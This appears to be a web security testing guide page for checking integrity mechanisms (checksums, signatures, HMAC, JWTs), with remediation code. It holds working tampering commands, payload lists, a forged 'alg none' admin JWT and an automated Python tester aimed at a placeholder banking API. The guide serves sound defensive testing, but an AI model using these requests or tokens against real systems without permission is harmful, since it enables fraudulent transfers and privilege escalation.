# WSTG-BUSL-03: Test Integrity Checks

## Test ID
WSTG-BUSL-03

## Test Name
Test Integrity Checks

## High-Level Description

Integrity testing examines whether an application properly validates that data has not been tampered with during transmission or storage. Applications may rely on checksums, hashes, digital signatures, or HMAC to ensure data integrity. This test identifies weaknesses in integrity verification mechanisms that allow attackers to modify data without detection, potentially leading to fraud, unauthorized transactions, or data corruption.

---

## What to Check

### Integrity Mechanisms

- [ ] Checksum validation
- [ ] Hash verification
- [ ] Digital signature validation
- [ ] HMAC implementation
- [ ] Encryption integrity (authenticated encryption)
- [ ] Database integrity constraints

### Common Weaknesses

| Weakness | Risk |
|----------|------|
| No integrity check | Data modification undetected |
| Weak hash algorithm (MD5) | Collision attacks |
| Client-side only validation | Bypass by request modification |
| Missing signature verification | Forged requests accepted |
| Hash without salt | Rainbow table attacks |

---

## How to Test

### Step 1: Identify Integrity Mechanisms

```bash
# Look for hash/signature fields in responses
curl -s "https://target.com/api/order/123" \
    -H "Authorization: Bearer $TOKEN" | jq '.'

# Example response with integrity fields:
# {
#   "order_id": "123",
#   "amount": 100,
#   "checksum": "abc123...",
#   "signature": "def456..."
# }

# Check request headers for integrity tokens
curl -s -v "https://target.com/api/order/123" 2>&1 | \
    grep -iE "signature|hash|checksum|hmac|digest"
```

### Step 2: Test Checksum/Hash Bypass

```bash
# Original request with checksum
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100,
        "checksum": "valid_checksum_here"
    }'

# Test without checksum
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100
    }'

# Test with empty checksum
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100,
        "checksum": ""
    }'

# Test with invalid checksum
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "from": "account1",
        "to": "account2",
        "amount": 100,
        "checksum": "invalid"
    }'
```

### Step 3: Test Data Modification with Same Checksum

```bash
# Original data with valid checksum
original_checksum="abc123..."

# Modify data, keep same checksum
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
        \"from\": \"account1\",
        \"to\": \"attacker\",
        \"amount\": 10000,
        \"checksum\": \"$original_checksum\"
    }"
```

### Step 4: Analyze Hash Algorithm

```bash
# Collect multiple checksums
# Try to identify algorithm by length/format

# MD5: 32 hex characters
# SHA1: 40 hex characters
# SHA256: 64 hex characters
# Base64 encoded will be different lengths

# Example: If you can control input and see checksum
for value in test test2 test3; do
    response=$(curl -s "https://target.com/api/generate?value=$value" \
        -H "Authorization: Bearer $TOKEN")
    echo "$value: $response"
done

# Compare with known algorithms
echo -n "test" | md5sum
echo -n "test" | sha1sum
echo -n "test" | sha256sum
```

### Step 5: Test Signature Verification

```bash
# If API uses signed requests
# Try request without signature header
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100}'

# Try with malformed signature
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -H "X-Signature: invalid_signature" \
    -d '{"amount": 100}'

# Try signature from different request
curl -s -X POST "https://target.com/api/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -H "X-Signature: $OLD_VALID_SIGNATURE" \
    -d '{"amount": 999999}'
```

### Step 6: Test Cookie/Token Integrity

```bash
# JWT without signature verification
# Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.signature

# Modify payload and use "none" algorithm
# Header: {"alg": "none"}
# Payload: {"user": "admin"}

# Base64 encode and send
modified_jwt="eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

curl -s "https://target.com/api/admin" \
    -H "Authorization: Bearer $modified_jwt"

# Test with empty signature
curl -s "https://target.com/api/admin" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ."
```

### Step 7: Test File Integrity

```bash
# If application verifies file integrity
# Upload file with modified content but same hash

# Check for hash collision vulnerability (MD5)
# Two different files with same MD5

# Test without integrity header
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@malicious.pdf"

# Test with mismatched hash
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-File-Hash: wrong_hash" \
    -F "file=@malicious.pdf"
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request manipulation | Modify integrity fields |
| **CyberChef** | Hash/encode operations | Generate test hashes |
| **jwt.io** | JWT manipulation | Test token integrity |

### Hash Analysis

| Tool | Description |
|------|-------------|
| **hashcat** | Hash cracking |
| **John the Ripper** | Hash analysis |
| **hash-identifier** | Identify hash type |

---

## Example Commands/Payloads

### Integrity Bypass Payloads

```json
// Remove integrity field
{"data": "modified", "amount": 99999}

// Empty integrity field
{"data": "modified", "checksum": ""}

// Null integrity
{"data": "modified", "checksum": null}

// Old/reused checksum
{"data": "completely_different", "checksum": "old_valid_checksum"}

// Wrong type
{"data": "modified", "checksum": 12345}
{"data": "modified", "checksum": true}
```

### Integrity Analysis Script

```python
#!/usr/bin/env python3
import requests
import hashlib
import hmac
import json

class IntegrityTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

    def test_missing_checksum(self, endpoint, data):
        """Test request without checksum"""
        # Remove checksum if present
        clean_data = {k: v for k, v in data.items()
                      if k not in ['checksum', 'hash', 'signature', 'hmac']}

        response = requests.post(
            f"{self.base_url}{endpoint}",
            headers=self.headers,
            json=clean_data
        )

        return {
            "test": "missing_checksum",
            "status": response.status_code,
            "accepted": response.status_code in [200, 201],
            "response": response.text[:200]
        }

    def test_empty_checksum(self, endpoint, data):
        """Test with empty checksum"""
        data_copy = data.copy()

        for field in ['checksum', 'hash', 'signature']:
            if field in data_copy:
                data_copy[field] = ""

        response = requests.post(
            f"{self.base_url}{endpoint}",
            headers=self.headers,
            json=data_copy
        )

        return {
            "test": "empty_checksum",
            "status": response.status_code,
            "accepted": response.status_code in [200, 201]
        }

    def test_modified_data_same_checksum(self, endpoint, original_data, modified_data):
        """Test if modified data accepted with original checksum"""
        # Get checksum from original
        checksum_fields = ['checksum', 'hash', 'signature']
        original_checksum = None

        for field in checksum_fields:
            if field in original_data:
                original_checksum = original_data[field]
                break

        if not original_checksum:
            return {"test": "no_checksum_found", "error": True}

        # Apply original checksum to modified data
        for field in checksum_fields:
            if field in original_data:
                modified_data[field] = original_checksum

        response = requests.post(
            f"{self.base_url}{endpoint}",
            headers=self.headers,
            json=modified_data
        )

        return {
            "test": "modified_data_same_checksum",
            "status": response.status_code,
            "accepted": response.status_code in [200, 201],
            "vulnerable": response.status_code in [200, 201]
        }

    def identify_hash_algorithm(self, hash_value):
        """Try to identify hash algorithm"""
        length = len(hash_value)

        algorithms = {
            32: "MD5 or UUID",
            40: "SHA1",
            56: "SHA224",
            64: "SHA256 or SHA3-256",
            96: "SHA384 or SHA3-384",
            128: "SHA512 or SHA3-512"
        }

        return algorithms.get(length, f"Unknown ({length} chars)")

# Usage
tester = IntegrityTester("https://target.com", "auth_token")

original = {
    "from": "acc1",
    "to": "acc2",
    "amount": 100,
    "checksum": "abc123..."
}

modified = {
    "from": "acc1",
    "to": "attacker",
    "amount": 999999
}

print(tester.test_missing_checksum("/api/transfer", original))
print(tester.test_empty_checksum("/api/transfer", original))
print(tester.test_modified_data_same_checksum("/api/transfer", original, modified))
```

---

## Remediation Guide

### 1. Implement HMAC for Request Integrity

```python
import hmac
import hashlib
import json

SECRET_KEY = "your-secret-key"  # Store securely

def create_hmac(data, secret=SECRET_KEY):
    """Create HMAC for data"""
    # Canonical JSON representation
    canonical = json.dumps(data, sort_keys=True, separators=(',', ':'))

    return hmac.new(
        secret.encode(),
        canonical.encode(),
        hashlib.sha256
    ).hexdigest()

def verify_hmac(data, provided_hmac, secret=SECRET_KEY):
    """Verify HMAC - constant time comparison"""
    expected = create_hmac(data, secret)
    return hmac.compare_digest(expected, provided_hmac)

@app.route('/api/transfer', methods=['POST'])
def transfer():
    data = request.json
    provided_hmac = request.headers.get('X-HMAC')

    if not provided_hmac:
        return jsonify({"error": "HMAC required"}), 400

    # Remove HMAC from data for verification
    verify_data = {k: v for k, v in data.items() if k != 'hmac'}

    if not verify_hmac(verify_data, provided_hmac):
        log_security_event("invalid_hmac", request)
        return jsonify({"error": "Invalid HMAC"}), 403

    # Process request
    return process_transfer(data)
```

### 2. Use Strong Hash Algorithms

```python
import hashlib

# BAD - Weak algorithms
def weak_hash(data):
    return hashlib.md5(data).hexdigest()  # Don't use

# GOOD - Strong algorithms
def strong_hash(data):
    return hashlib.sha256(data.encode()).hexdigest()

# BETTER - With salt
import secrets

def salted_hash(data, salt=None):
    if salt is None:
        salt = secrets.token_hex(16)

    combined = salt + data
    hash_value = hashlib.sha256(combined.encode()).hexdigest()

    return f"{salt}:{hash_value}"

def verify_salted_hash(data, stored_hash):
    salt, _ = stored_hash.split(':')
    return salted_hash(data, salt) == stored_hash
```

### 3. Digital Signatures for Critical Operations

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend
import base64

def sign_data(data, private_key):
    """Sign data with RSA private key"""
    message = json.dumps(data, sort_keys=True).encode()

    signature = private_key.sign(
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

    return base64.b64encode(signature).decode()

def verify_signature(data, signature, public_key):
    """Verify signature with RSA public key"""
    message = json.dumps(data, sort_keys=True).encode()
    sig_bytes = base64.b64decode(signature)

    try:
        public_key.verify(
            sig_bytes,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False
```

### 4. Authenticated Encryption

```python
from cryptography.fernet import Fernet
# Fernet provides authenticated encryption (AES-CBC + HMAC)

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_with_integrity(data):
    """Encrypt data with built-in integrity check"""
    json_data = json.dumps(data).encode()
    return cipher.encrypt(json_data).decode()

def decrypt_and_verify(encrypted_data):
    """Decrypt and verify integrity"""
    try:
        decrypted = cipher.decrypt(encrypted_data.encode())
        return json.loads(decrypted), True
    except Exception:
        return None, False
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Missing integrity validation | 9.8 | Critical |
| Weak hash algorithm (MD5) | 7.5 | High |
| Client-side only integrity check | 8.8 | High |
| Signature bypass | 9.8 | Critical |
| Checksum bypass | 8.8 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-345** | Insufficient Verification of Data Authenticity | Missing integrity check |
| **CWE-328** | Use of Weak Hash | MD5/SHA1 usage |
| **CWE-347** | Improper Verification of Cryptographic Signature | Signature bypass |
| **CWE-354** | Improper Validation of Integrity Check Value | Checksum bypass |

---

## References

- [OWASP WSTG - Test Integrity Checks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks)
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [NIST Hash Functions](https://csrc.nist.gov/projects/hash-functions)

---

## Checklist

```
[ ] Integrity mechanisms identified
[ ] Hash algorithm analyzed
[ ] Missing checksum/signature tested
[ ] Empty integrity values tested
[ ] Modified data with old checksum tested
[ ] Client-side vs server-side validation checked
[ ] JWT signature verification tested
[ ] File upload integrity tested
[ ] HMAC implementation reviewed
[ ] Weak algorithms identified (MD5, SHA1)
[ ] Findings documented
[ ] Remediation recommendations provided
```
